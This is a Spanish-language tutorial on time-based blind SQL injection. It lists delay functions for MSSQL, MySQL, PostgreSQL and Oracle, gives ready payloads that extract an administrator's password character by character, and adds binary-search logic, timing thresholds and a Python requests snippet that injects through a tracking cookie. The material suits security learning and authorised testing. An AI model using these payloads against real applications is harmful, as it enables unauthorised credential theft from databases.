# Blind SQLi mediante time delays

Cuando una aplicación **no revela** diferencias en la respuesta ante condiciones booleanas ni muestra errores (p. ej. captura/graba errores internamente), aún es posible inferir true/false observando **el tiempo** que tarda en responder.

Si puedes inyectar una expresión que **haga que la base de datos espere** (sleep/delay) sólo cuando una condición es verdadera, entonces el tiempo de respuesta indica la verdad de esa condición.

Esto convierte la diferencia de tiempo en un canal de exfiltración (un bit por petición).

---

## 1) Mecanismos por SGBD (funciones de delay y estructuras útiles)

Cada gestor tiene sus funciones y formas de condicionar la ejecución. A continuación las más usadas:

### Microsoft SQL Server (T-SQL)

* Función para retraso: **`WAITFOR DELAY 'hh:mm:ss'`**
* Estructura condicional típica:

  ```sql
  '; IF (condición) WAITFOR DELAY '0:0:10'--
  ```

  * Si `condición` es cierta, el servidor espera 10 segundos antes de continuar; la respuesta HTTP se retrasa.
* Otra variante (usar BEGIN...END si hace falta):

  ```sql
  '; IF (condición) BEGIN WAITFOR DELAY '0:0:10' END--
  ```

### MySQL

* Función para retraso: **`SLEEP(seconds)`**
* Variante básica:

  ```sql
  ' OR IF(condición, SLEEP(5), 0) #
  ```

  o

  ```sql
  ' OR (CASE WHEN condición THEN SLEEP(5) ELSE 0 END)--
  ```

  * `IF`/`CASE` ejecutan `SLEEP(5)` sólo si `condición` es verdadera.
  * Comentarios: en MySQL `--` requiere espacio posterior; `#` funciona como comentario con menos problemas.

### PostgreSQL

* Función para retraso: **`pg_sleep(seconds)`**
* Ejemplo:

  ```sql
  '; SELECT CASE WHEN (condición) THEN pg_sleep(5) ELSE pg_sleep(0) END;--
  ```

  o más sencillo:

  ```sql
  ' OR (SELECT CASE WHEN (condición) THEN pg_sleep(5) ELSE 0 END)--
  ```

### Oracle

* Función para retraso: **`DBMS_LOCK.SLEEP(seconds)`** (necesita privilegios en muchos entornos)
* Ejemplo:

  ```sql
  ' || (CASE WHEN condición THEN DBMS_LOCK.SLEEP(5) ELSE NULL END) -- (sintaxis depende del contexto)
  ```
* Nota: muchas instalaciones no permiten DBMS_LOCK o requieren permisos; si no está disponible, se usan otras técnicas (heavy queries, OAST).

### SQLite

* No hay `SLEEP` nativo, pero se puede inducir retrasos con funciones definidas por extensión o consultas costosas; sin embargo en la práctica SQLite no es frecuente en este tipo de vectores web.

---

## 2) Construcción general del payload

1. **Cierra correctamente** cualquier comilla abierta si la aplicación rodea tu input con `'` o `"`.
2. **Inserta una condición** que dependa de la información que quieres extraer (ej. `ASCII(SUBSTRING(...)) > mid`).
3. **Si la condición es verdadera**, ejecuta la función de delay (`SLEEP`, `pg_sleep`, `WAITFOR`), si no, ejecuta 0 o nada.
4. **Comenta el resto** de la consulta con `-- `, `#` o `/*...*/` según SGBD y contexto.

Formato genérico (ejemplos):

* **MSSQL**:

  ```sql
  '; IF (CONDICION) WAITFOR DELAY '0:0:10'--
  ```
* **MySQL**:

  ```sql
  ' OR IF(CONDICION, SLEEP(5), 0) --
  ```
* **Postgres**:

  ```sql
  ' OR (SELECT CASE WHEN (CONDICION) THEN pg_sleep(5) ELSE 0 END)--
  ```

---

## 3) Ejemplo práctico — extraer primer carácter del password

Supongamos tabla `users(username,password)` y que queremos saber si el primer carácter del password de `Administrator` es mayor que `m`.

### MSSQL

```sql
'; IF (SELECT COUNT(*) FROM Users WHERE username='Administrator' AND SUBSTRING(password,1,1) > 'm') = 1 WAITFOR DELAY '0:0:10'--
```

* Si el conteo = 1 → condición verdadera → WAITFOR retrasa 10s → respuesta lenta.

### MySQL

```sql
' OR IF((SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='Administrator') > 109, SLEEP(5), 0) --
```

* `ASCII(...) > 109` equivale a `> 'm'`.

### PostgreSQL

```sql
' OR (SELECT CASE WHEN (ASCII(SUBSTRING(password FROM 1 FOR 1)) > 109) THEN pg_sleep(5) ELSE 0 END FROM users WHERE username='Administrator')--
```

### Oracle (si DBMS_LOCK disponible)

```sql
' || (CASE WHEN (ASCII(SUBSTR((SELECT password FROM users WHERE ROWNUM=1),1,1)) > 109) THEN DBMS_LOCK.SLEEP(5) ELSE NULL END) --
```

(ajusta concatenación y contexto según cómo la app inserte tu input)

---

## 4) Optimización: búsqueda binaria sobre ASCII (reduce peticiones)

En lugar de probar todos los caracteres alfabéticos secuencialmente, usa búsqueda binaria sobre el rango ASCII imprimible (por ejemplo 32–126).

* Cada petición determina si ASCII(char) > mid.
* Repite hasta aislar el valor (log2(95) ≈ 7 peticiones por carácter en promedio).

**Pseudocódigo lógico**:

```
lo = 32; hi = 126
while lo <= hi:
  mid = (lo+hi)//2
  payload = build_payload_check_ascii(pos, mid)
  if response_delayed(payload): lo = mid+1
  else: hi = mid-1
char = chr(lo or hi)
```

---

## 5) Medición y fiabilidad

* Define un **umbral**: si usas `SLEEP(5)`, considera la respuesta "lenta" si el *response_time* > (baseline + tolerance), p. ej. baseline + 3s.
* **Establece baseline** haciendo peticiones control: una con condición true conocida y otra con condition false conocida para comparar.
* **Reintentos**: haz 2–3 peticiones por verificación y promedia para evitar falsos positivos por jitter o tráfico de red.
* **Rate limiting**: no abuses; muchos delays largos generan ruido y pueden activar alertas o bloquear.

---

## 6) Automatización (herramientas y scripts)

* **sqlmap** soporta time-based (`--technique=T`) y puede automatizar extracción.
* **Burp Intruder** o **Repeater** para pruebas manuales.
* **Scripts Python** con `requests` para control total: medir tiempos, implementar búsqueda binaria, reintentos y tolerancia.

Ejemplo minimal en pseudocode Python:

```py
payload = "' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='Administrator'),{pos},1)) > {mid}, SLEEP(5), 0) --"
resp = requests.get(url, cookies={'TrackingId': payload})
if resp.elapsed.total_seconds() > threshold: condition=True
```

---

## 7) Limitaciones y contramedidas

* **Latencia / ruido de red**: hace más difícil distinguir delays pequeños; usa SLEEP suficientemente grande y multiple reintentos.
* **WAF/IDS**: patrones con `SLEEP`, `WAITFOR` o `pg_sleep` suelen ser bloqueados o detectados.
* **Privilegios**: algunas funciones pueden requerir permisos (por ejemplo `DBMS_LOCK.SLEEP`).
* **Coste en tiempo**: extracción por time-based es lenta (una sola extracción completa de una contraseña larga puede tardar horas).

---


